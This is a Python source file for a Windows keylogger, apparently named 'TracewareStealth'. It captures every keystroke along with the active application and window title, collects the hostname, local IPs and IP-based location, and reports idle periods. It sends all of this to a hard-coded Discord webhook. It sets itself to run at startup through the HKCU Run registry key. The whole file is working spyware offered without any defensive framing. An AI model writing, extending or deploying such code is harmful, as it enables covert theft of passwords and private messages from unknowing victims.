import os
import psutil
import requests
import time
import socket
import win32gui
import win32process
import win32api
import threading
import atexit
import winreg as reg
from datetime import datetime
from pynput import keyboard

# Discord Webhook URL
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"

# Get PC name
PC_NAME = socket.gethostname()

# Function to get local IPv4 and IPv6 addresses
def get_local_ips():
    ipv4, ipv6 = "Unknown", "Unknown"
    try:
        hostname = socket.gethostname()
        ipv4 = socket.gethostbyname(hostname)
        for addr in socket.getaddrinfo(hostname, None):
            if addr[0] == socket.AF_INET6:
                ipv6 = addr[4][0]
                break
    except socket.error as e:
        print(f"Error fetching IP addresses: {e}")
    return ipv4, ipv6

# Function to get location based on IP address
def get_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country", "Unknown")
        postal = data.get("postal", "Unknown")
        timezone = data.get("timezone", "Unknown")  # Get timezone information
        return city, region, country, postal, timezone
    except requests.exceptions.RequestException as e:
        print(f"Error fetching location: {e}")
        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"

# Get IP Addresses
IPV4_ADDRESS, IPV6_ADDRESS = get_local_ips()

# Get Location
CITY, REGION, COUNTRY, POSTAL, TIMEZONE = get_location()

# Tracking Variables
last_logged = None
keystrokes = ""
keystroke_lock = threading.Lock()
keystroke_app = "Unknown"
keystroke_window = "Unknown"

# Function to send logs to Discord with color coding
def send_to_discord(title, description, color):
    payload = {
        "embeds": [{
            "title": title,
            "description": description,
            "color": color
        }]
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

# Function to log system startup
def log_system_start():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = (f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - "
               f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL}, Timezone: {TIMEZONE} - Connection Established")
    send_to_discord("SYSTEM START", message, 65280)  # Green

# Function to log system shutdown
def log_system_shutdown():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Connection Lost"
    send_to_discord("SYSTEM SHUTDOWN", message, 16711680)  # Red

# Register shutdown hook
atexit.register(log_system_shutdown)

# Handle forceful termination
def handle_exit(sig):
    log_system_shutdown()
    os._exit(1)

win32api.SetConsoleCtrlHandler(handle_exit, True)

# Function to get active window title
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    if not hwnd:
        return None, None
    
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == pid:
            return proc.info['name'], win32gui.GetWindowText(hwnd)
    
    return None, None

# Function to send keystrokes
def send_keystrokes():
    global keystrokes, keystroke_app, keystroke_window
    
    with keystroke_lock:
        if keystrokes.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"[{timestamp}] {PC_NAME} - ({keystroke_app} - {keystroke_window}): {keystrokes}"
            send_to_discord("KEYLOG", message, 0)  # Yellow
            keystrokes = ""
            keystroke_app, keystroke_window = "Unknown", "Unknown"

# Function to log keystrokes using pynput
def on_press(key):
    global keystrokes, keystroke_app, keystroke_window
    
    try:
        char = key.char  # Get the character from the key
        if char:
            with keystroke_lock:
                if not keystrokes:
                    keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
                keystrokes += char
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            keystrokes += " "
        elif key == keyboard.Key.enter:
            keystrokes += "\n"
            send_keystrokes()  # Send log immediately on enter
        elif key == keyboard.Key.backspace and keystrokes:
            keystrokes = keystrokes[:-1]

# Start the keylogger listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Function to periodically send keystrokes
def keystroke_monitor():
    while True:
        time.sleep(5)  # Check every second
        send_keystrokes()

keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
keystroke_thread.start()

# Function to add the script to Windows startup
def add_to_startup():
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "TracewareStealth"
    script_path = os.path.abspath(__file__)
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, script_path)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

# Add to startup
add_to_startup()

# Function to check idle time
def get_idle_duration():
    last_input_info = win32api.GetLastInputInfo()
    idle_time = (win32api.GetTickCount() - last_input_info) / 1000.0  # Convert to seconds
    return idle_time

# Function to monitor idle time
def monitor_idle_time():
    idle_duration = 0
    while True:
        time.sleep(1)  # Check every second
        idle_duration = get_idle_duration()
        if idle_duration >= 5:  # 10 seconds of inactivity
            log_idle_connection(idle_duration)

def log_idle_connection(duration):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = (f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - "
               f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL}, Timezone: {TIMEZONE} - "
               f"SYSTEM IDLE for {duration} seconds.")
    send_to_discord("SYSTEM IDLE", message, 16776960)  # Yellow

# Start the idle time monitoring thread
idle_monitor_thread = threading.Thread(target=monitor_idle_time, daemon=True)
idle_monitor_thread.start()

# Monitoring loop
def monitor():
    global last_logged
    try:
        while True:
            new_app_name, new_window_title = get_active_window_title()
            if new_app_name and new_window_title and (new_app_name, new_window_title) != last_logged:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})"
                send_to_discord("WINDOW ACTIVE", message, 255)  # Blue
                last_logged = (new_app_name, new_window_title)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        log_system_shutdown()  # Ensure shutdown log is always sent

if __name__ == "__main__":
    log_system_start()  # Ensure this runs before monitoring starts
    monitor()